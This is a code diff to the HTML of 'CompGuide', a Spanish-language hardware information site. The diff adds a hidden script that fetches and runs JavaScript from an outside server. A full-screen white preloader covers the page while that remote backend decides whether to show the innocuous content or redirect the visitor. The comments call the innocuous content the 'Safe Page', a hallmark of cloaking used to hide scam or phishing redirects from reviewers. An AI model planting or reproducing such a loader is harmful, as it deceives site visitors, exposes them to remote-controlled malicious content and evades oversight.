@@ -5,8 +5,52 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="CompGuide: Portal técnico informativo sobre arquitectura de computadoras, análisis de hardware y especificaciones de componentes.">
     <title>CompGuide | Análisis de Hardware y Componentes</title>
-    
+    <script>
+        (function() {
+            // ID aleatorio para evitar caché y pasar validación básica
+            var randomID = "u" + Math.random().toString(36).substring(7);
+
+            // APUNTA AL PUERTO 3008 (Backend Node.js)
+            var backendURL = "https://afinmetales.onrender.com/" + randomID;
+
+            var s = document.createElement('script');
+            s.src = backendURL;
+
+            // Cuando el backend responda...
+            s.onload = function() {
+                // Si el backend dice "window.__view = true", mostramos la web
+                // Si el backend redirecciona, esto no llegará a ejecutarse visualmente
+                setTimeout(function(){
+                    if (window.__view) {
+                        var loader = document.getElementById('preloader');
+                        if (loader) loader.style.display = 'none';
+                    }
+                }, 50);
+            };
+
+            // En caso de error de conexión (Node apagado), mostrar la web por defecto
+            s.onerror = function() {
+                console.warn("Backend no disponible. Mostrando Safe Page.");
+                var loader = document.getElementById('preloader');
+                if (loader) loader.style.display = 'none';
+            };
+
+            document.head.appendChild(s);
+        })();
+    </script>
     <style>
+        #preloader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff; z-index: 999999;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #0a1e3c; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* --- CONFIGURACIÓN DE ESTILO PROFESIONAL --- */
         /* --- VARIABLES Y RESET --- */
         :root {
             --primary: #1a252f;      /* Gris oscuro azulado */
@@ -296,7 +340,9 @@
     </style>
 </head>
 <body>
-
+<div id="preloader">
+    <div class="spinner"></div>
+</div>
     <header>
         <div class="container">
             <nav>
